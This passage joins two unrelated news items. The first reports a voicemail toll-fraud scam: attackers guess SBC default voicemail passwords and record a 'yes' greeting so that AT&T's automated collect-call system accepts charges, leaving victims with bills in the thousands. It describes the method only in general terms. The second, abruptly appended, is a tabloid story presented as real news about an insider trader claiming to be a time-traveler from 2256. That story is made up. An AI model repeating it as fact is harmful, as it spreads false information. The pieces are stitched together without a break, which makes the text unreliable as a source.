 Victims say that AT&T and SBC know about the scam and are taking no concrete action to
 protect consumers from it. But AT&T spokesman Gordon Diamond said that AT&T has been
 instrumental in stopping the scam. 

 "AT&T has ambitious programs that use sophisticated technology to detect and deter phone
 scams and protect our customers," Diamond said. "We detected these scams, and we stopped
 them. But technological deterrents can't do the job alone, and consumers and businesses
 are responsible for ensuring the security of their phone lines."

 Here's how the scam works: The default passwords that SBC issues to new users of their
 voicemail services are in a specific format and are easily guessed.

 If the default password is not changed after the system is set up, it's ripe for exploitation
 by malicious hackers, who have been breaking into SBC voicemail systems and replacing the
 owners' recorded greetings with recordings of a voice saying "yes" at appropriate intervals.

 The hackers then place a collect call, typically from the Philippines or Saudi Arabia, to
 the hacked system at an odd hour, assuming that the voicemail system will pick up.

 AT&T uses an automated voice-recognition system when processing collect calls. The recording
 asks whether the party who is being called will accept the charges. When the hacked system
 responds "yes," the call is connected. 

 Once connected, the hackers have been leaving the line open for hours -- and in some cases for
 days -- resulting in enormous bills for the victim.

 According to network security expert Mike Sweeney, there are a few reasons why the malicious
 hackers might leave the line open.

 "One is just to mind fuck with someone just because they can," said Sweeney. "But I also know
 that hackers will set up conference calls this way to discuss various 'business deals' at no
 cost to themselves. They might have set up the conference ... and just left the line up when
 they were done -- it's the victims' dime, so why bother stopping it?"

 K.C. Hatcher, a San Francisco graphic artist and one of the scam's casualties, has been billed
 $12,000 dollars for calls that both she and AT&T agree she didn't make. But she's expected to
 pay for those calls anyway, as are the other victims.

 In Hatcher's case, the scam was carried out on her business line on New Year's Eve. Hatcher said
 when she returned to the office after the holiday, she received a call from Bill Allen of AT&T
 Fraud Detection, who told her he thought she was the victim of telephone fraud.

 "I checked my outgoing message and discovered it had been altered, exactly as Mr. Allen said it
 would be," Hatcher said. "In a man's voice with a foreign accent the new message stated something
 like, 'Yes, yes, I will accept the charges, yes, yes, yes....'"

 Hatcher said Allen then issued her a case number to dispute the charges once she received her next
 phone bill. "He said that I probably would not have to pay the charges, as this type of incident
 happened quite often, and that AT&T often waived the charges."

 Later Hatcher was told that AT&T would take 35 percent off her bill, but she'd have to pay $8,000.

 Hatcher was not happy.

 "AT&T then suggested I 'go after' SBC, and SBC blames AT&T for holding the victim responsible for
 the crime," Hatcher said. "Basically, these two communications giants are pointing the finger at
 each other, and I'm caught in the middle with the bill to pay, or my credit will be ruined."

 Other victims of the scam had the same experience.

 "I got a call from AT&T's fraud division after Christmas, asking me to check my voicemail message,"
 said Mary Runyon, a Texas-based photographer. "To my alarm, my outgoing message had been replaced
 with a message from some man with a thick accent saying 'yes uh uh ... yes ... uh uh ... sure.'"

 Runyon said that she was billed $7,256.34 for two calls; AT&T offered a 30 percent discount. When
 she refused, her account was turned over to a collection agency.

 "In the process of fighting this, I spoke to numerous people at AT&T and SBC. Not one sounded
 surprised when I told them about this scam," Runyon said. "I got the distinct impression that
 this scam is widespread and new victims are being exploited daily."

 AT&T's Diamond said the scam is not being widely perpetrated.

 "These are isolated incidents, and we do all we can to ensure the safety of our customers and our
 network. However, in these instances, there is no question that the customer is in the best position
 to ensure the security of their voicemail systems."

 SBC said in a statement that the company includes a written warning to all new customers advising
 them to change their default passwords immediately.

 Runyon and Hatcher acknowledge that they didn't change their default passwords. Both said they later
 discovered that the warning was included in a large package of information that appeared to reiterate
 the conversation they'd had with a sales rep when they set up their accounts.

 "I did not change my password because I was not expressly advised to do so," Hatcher said. "I hold both
 companies responsible for not going to adequate measures to alert their consumers to a very expensive
 problem so that we could at least try to protect ourselves from its occurrence."

 SBC's written warning isn't enough, agreed Linda Sherry, executive director of the San Francisco
 organization, Consumer Action. The company should have issued random default passwords that are not
 easily guessed, as it now does for new business accounts.

 Sherry also slammed AT&T for its automated system.

 "That AT&T would permit third-party phone charges based only on the authority of a recorded message is
 beyond belief," Sherry fumed. "Third-party billing should be allowed only when a real person answers
 the phone and is able to verify that they approve the charges."

 Diamond said AT&T has no plans to change the automated system, "which has proven to be extremely reliable
 for many, many years."

 MCI uses an automated system similar to AT&T's. Sprint uses live operators to process collect calls.

 Consumer Action is asking AT&T and SBC to reimburse the scam victims.

  'TIME-TRAVELER' BUSTED FOR INSIDER TRADING


  Wednesday March 19, 2003

  By CHAD KULTGEN

  http://tv.yahoo.com/news/wwn/20030319/104808600007.html


  NEW YORK -- Federal investigators have arrested an enigmatic Wall Street wiz on insider-trading
  charges -- and incredibly, he claims to be a time-traveler from the year 2256! 

  Sources at the Security and Exchange Commission confirm that 44-year-old Andrew Carlssin offered
  the bizarre explanation for his uncanny success in the stock market after being led off in handcuffs
  on January 28.

  "We don't believe this guy's story -- he's either a lunatic or a pathological liar," says an SEC
  insider.

  "But the fact is, with an initial investment of only $800, in two weeks' time he had a portfolio
  valued at over $350 million. Every trade he made capitalized on unexpected business developments,
  which simply can't be pure luck. 

  "The only way he could pull it off is with illegal inside information. He's going to sit in a jail
  cell on Rikers Island until he agrees to give up his sources."

  The past year of nose-diving stock prices has left most investors crying in their beer. So when
  Carlssin made a flurry of 126 high-risk trades and came out the winner every time, it raised the
  eyebrows of Wall Street watchdogs.

  "If a company's stock rose due to a merger or technological breakthrough that was supposed to be
  secret, Mr. Carlssin somehow knew about it in advance," says the SEC source close to the hush-hush,
  ongoing investigation.

  When investigators hauled Carlssin in for questioning, they got more than they bargained for: A mind-
  boggling four-hour confession.

  Carlssin declared that he had traveled back in time from over 200 years in the future, when it is common
  knowledge that our era experienced one of the worst stock plunges in history. Yet anyone armed with know-
  ledge of the handful of stocks destined to go through the roof could make a fortune.

  "It was just too tempting to resist," Carlssin allegedly said in his videotaped confession. "I had planned
  to make it look natural, you know, lose a little here and there so it doesn't look too perfect. But I just
  got caught in the moment." 

  In a bid for leniency, Carlssin has reportedly offered to divulge "historical facts" such as the whereabouts
  of Osama Bin Laden and a cure for AIDS.

  All he wants is to be allowed to return to the future in his "time craft."

  However, he refuses to reveal the location of the machine or discuss how it works, supposedly out of fear
  the technology could "fall into the wrong hands."
